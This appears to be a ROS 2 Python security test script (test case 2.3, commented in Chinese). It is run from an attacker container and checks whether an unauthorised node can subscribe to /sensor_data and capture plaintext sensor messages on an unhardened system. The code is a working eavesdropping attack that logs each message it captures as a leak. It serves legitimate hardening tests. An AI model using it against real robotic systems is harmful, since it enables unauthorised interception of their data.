#!/usr/bin/env python3
"""
測試案例 2.3：未授權訂閱敏感 topic

目的：驗證未授權參與者能否訂閱並竊取敏感資料。
預期結果（未加固）：可成功訂閱 /sensor_data 並持續收到明文。
成功判定：收到 >=1 筆含 "battery=" 的訊息。

用法（attacker 容器內）：
    source /opt/ros/jazzy/setup.bash
    python3 /work/attacks/unauth_subscribe.py
"""
import rclpy
from rclpy.node import Node
from std_msgs.msg import String


class Eavesdropper(Node):
    def __init__(self):
        super().__init__('eavesdropper')  # 偽裝的攻擊者節點
        self.count = 0
        self.create_subscription(String, '/sensor_data', self.on_data, 10)
        self.get_logger().warn('[ATTACK 2.3] 開始竊聽 /sensor_data ...')

    def on_data(self, msg: String):
        self.count += 1
        self.get_logger().warn(f'[LEAK #{self.count}] {msg.data}')
        if self.count >= 5:
            self.get_logger().error('成功竊取 5 筆敏感資料，攻擊成立。')
            raise SystemExit


def main():
    rclpy.init()
    node = Eavesdropper()
    try:
        rclpy.spin(node)
    except (KeyboardInterrupt, SystemExit):
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()
